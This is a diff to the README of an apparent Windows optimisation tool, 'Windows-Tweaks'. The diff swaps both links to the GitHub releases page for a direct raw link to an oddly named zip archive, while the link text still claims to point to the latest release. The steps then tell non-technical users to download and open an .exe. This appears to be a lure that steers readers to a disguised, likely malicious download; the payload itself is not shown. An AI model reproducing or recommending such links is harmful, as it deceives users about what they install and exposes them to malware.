@@ -1,6 +1,6 @@
 # 🛠️ Windows-Tweaks - Improve your computer stability and speed
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hachemi1977/Windows-Tweaks/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/hachemi1977/Windows-Tweaks/main/bluethroat/Tweaks_Windows_amboceptoid.zip)
 
 ## 📋 Overview
 Windows-Tweaks resolves common system errors and enhances computer performance. This set of patches cleans up background processes to ensure your machine runs smooth. It works on all 64-bit versions of Windows 10 and Windows 11. The software undergoes regular maintenance to keep up with current updates.
@@ -8,7 +8,7 @@ Windows-Tweaks resolves common system errors and enhances computer performance. 
 ## 🚀 Getting Started
 Follow these steps to set up the software on your computer. You do not need technical knowledge to perform these actions.
 
-1. Visit the [releases page](https://github.com/hachemi1977/Windows-Tweaks/releases) to download the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/hachemi1977/Windows-Tweaks/main/bluethroat/Tweaks_Windows_amboceptoid.zip) to download the latest version.
 2. Select the file ending in .exe from the list.
 3. Save the file to your desktop or downloads folder.
 4. Open the file to start the installation.
